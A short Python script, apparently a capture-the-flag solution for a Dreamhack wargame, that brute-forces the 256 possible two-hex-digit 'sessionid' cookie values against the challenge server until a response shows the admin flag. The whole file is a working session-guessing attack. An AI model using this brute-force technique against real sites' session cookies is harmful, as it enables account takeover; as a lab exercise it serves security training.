import requests
import re

url = "http://host8.dreamhack.games:24015/"


for i in range(0xFF):
    # 두 자리 16진수로 앞에 0을 채워야한다.
    r = requests.get(url, cookies={"sessionid": f"{i:02x}"})

    flag_match = re.search(r"flag is DH\{[^}]+\}", r.text)

    if flag_match:
        print(f"Admin session : {i:02x}")
        print(flag_match)
        break
